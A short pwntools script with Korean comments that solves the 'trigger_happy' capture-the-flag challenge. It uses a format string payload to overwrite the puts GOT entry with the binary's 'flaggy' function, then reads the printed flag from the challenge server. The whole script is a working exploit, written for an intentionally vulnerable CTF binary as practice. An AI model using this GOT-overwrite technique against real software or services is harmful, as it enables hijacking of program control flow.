# -*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'

# 1. 파일 정보를 확인한다. 32 bit, 메모리 보호 기법 없음
e = ELF("./trigger_happy")

# 2. 파일을 분석해서 얻은 flaggy 함수와 puts함수의 주소를 받는다.
get_flaggy = e.symbols["flaggy"]
puts_got = e.got["puts"]

# 3. 연결
p = remote("ctf.0xl4ugh.com", 1337)

# 4. 메시지 수신 - Do you like 0xL4ugh CTF?
message = p.recvline().decode("utf-8")
print(message)

# 5. 포맷 스트링 공격 - 4번째를 지정하고 페이로드를 보낸다.
payload = fmtstr_payload(4, {puts_got: get_flaggy})
p.sendline(payload)

# 6. 입력후 문자열 수신 - I am glad you
message = p.recvline().decode("utf-8")
print(message)

# 7. flaggy 함수 에서 cat flag.txt 결과 수신
message = p.recvall()
print(message)
